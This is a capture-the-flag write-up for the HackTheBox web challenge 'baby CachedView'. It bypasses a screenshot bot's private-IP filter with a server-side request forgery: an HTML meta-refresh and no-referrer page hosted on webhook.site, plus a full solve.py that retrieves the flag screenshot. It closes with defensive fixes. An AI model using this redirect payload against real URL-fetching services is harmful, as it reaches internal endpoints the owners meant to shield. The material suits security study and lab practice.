---
title: "baby CachedView"
date: 2027-05-06 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssrf, dns-rebinding, referer, headless-browser, meta-refresh]
description: "An Easy Web challenge: a screenshot service runs a headless, JavaScript-disabled browser on the server. The flag page only answers requests from 127.0.0.1 with no Referer. The intended DNS-rebinding solve is defeated by the box's caching resolver, so a no-JavaScript, no-referrer redirect over plain HTTP wins instead."
---

## Overview

**baby CachedView** is an Easy Web challenge. The app lets you submit a URL and it
"caches" the page by screenshotting it with a **headless Firefox that has JavaScript
disabled**. The secret lives at `/flag`, which only responds to requests coming **from
`127.0.0.1` with no `Referer` header**. The whole challenge is a
[server-side request forgery](https://cwe.mitre.org/data/definitions/918.html)
([CWE-918](https://cwe.mitre.org/data/definitions/918.html)) against the screenshot bot:
make the on-box browser open `http://127.0.0.1/flag` without leaking where it came from,
and it screenshots the flag for you.

## The technique

Two guards stand between you and the flag:

```python
def cache_web(url):
    domain = urlparse(url).hostname
    if scheme not in ['http', 'https']: ...                  # http/https only
    if is_inner_ipaddress(socket.gethostbyname(domain)):     # blocks 127/8,10/8,172.16/12,192.168/16,0/8
        return flash('IP not allowed', 'danger')
    return serve_screenshot_from(url, domain)                # headless Firefox navigates + screenshots

@web.route('/flag')
@is_from_localhost           # remote_addr == '127.0.0.1' AND NOT request.referrer
def flag():
    return send_file('flag.png')
```

The screenshot bot connects through nginx on `127.0.0.1`, so anything it loads that reaches
`http://127.0.0.1/flag` is already loopback-sourced. The problems:

1. You can't submit `http://127.0.0.1/flag` directly — `cache_web` resolves the host once
   and rejects internal ranges.
2. `/flag` 403s if **any** `Referer` is present, so a normal redirect won't work.

The *intended* solve is **DNS rebinding** — a hostname that resolves to a public IP for the
validator's check, then to `127.0.0.1` for the browser's fetch (the flag even spells it out).
On this instance that fails: the container's resolver **caches** the first (public) answer,
so the browser gets the same public IP the validator got and never rebinds — it just hangs.
A multi-record `A`/`B` round-robin is no better, because headless Firefox always tries the
non-loopback record first and never fails over within the page-load timeout.

So instead of DNS trickery, use a **redirect that emits no `Referer`** — and one that works
**without JavaScript** (the bot has JS off) and **without HTTPS** (this box can only egress
plain HTTP on port 80; outbound 443 is blocked, so tunnels like cloudflared are unreachable).

Two HTML tags do exactly that, with no JavaScript:

```html
<meta name="referrer" content="no-referrer">
<meta http-equiv="refresh" content="0; url=http://127.0.0.1/flag">
```

`meta http-equiv="refresh"` navigates the page with JS disabled, and
`meta name="referrer" content="no-referrer"` strips the `Referer`. The validator only checks
the **first** submitted host, so point it at a public host serving that page and let the bot
redirect itself to the flag.

## Solution

`webhook.site` answers over plain **HTTP/80** and lets you define the response body via its
token API — no server, tunnel, or public IP of your own needed.

Create `solve.py`:

```python
import sys, json, urllib.request

box = sys.argv[1]  # host:port

html = ('<!doctype html><html><head>'
        '<meta name="referrer" content="no-referrer">'
        '<meta http-equiv="refresh" content="0; url=http://127.0.0.1/flag">'
        '</head><body>go</body></html>')

def post_json(url, obj):
    req = urllib.request.Request(url, data=json.dumps(obj).encode(),
                                 headers={'Content-Type': 'application/json'})
    return json.loads(urllib.request.urlopen(req, timeout=50).read())

# 1) public HTTP/80 page that redirects to /flag with no Referer
tok = post_json('https://webhook.site/token',
                {'default_status': 200, 'default_content': html,
                 'default_content_type': 'text/html'})
redirector = f"http://webhook.site/{tok['uuid']}"

# 2) submit it: validator sees public webhook.site (passes); bot redirects to 127.0.0.1/flag
resp = post_json(f'http://{box}/api/cache', {'url': redirector})

# 3) the screenshot of /flag now contains the flag
png = urllib.request.urlopen(f"http://{box}/static/screenshots/{resp['filename']}").read()
open('flag_shot.png', 'wb').write(png)
print('saved flag_shot.png — the flag is rendered in the image')
```

Run it against the live instance and open the screenshot — the flag image is rendered at the
top:

```bash
python3 solve.py <host>:<port>
# -> flag_shot.png contains HTB{...}
```

## Why it worked

The IP filter validated the *public* redirector, not the *final* loopback destination — a
classic validate-here / fetch-there SSRF gap. And `remote_addr == 127.0.0.1` plus "no
`Referer`" are not authentication: an on-box bot satisfies both trivially. Because
`meta` refresh and `meta` referrer are HTML features (not JavaScript), disabling JS in the
screenshot browser did nothing to stop them.

## Fix / defense

- Re-validate the destination against private-IP ranges **at fetch time**, after every
  redirect/refresh hop — never validate once on the submitted host and fetch later.
- Don't gate sensitive routes on `remote_addr`/loopback or the absence of a `Referer`; an
  SSRF bot already running on localhost forges both. Require a real session token.
- Run the headless renderer in an isolated network namespace with no route to loopback or
  internal services, and forbid it from following redirects to private addresses.
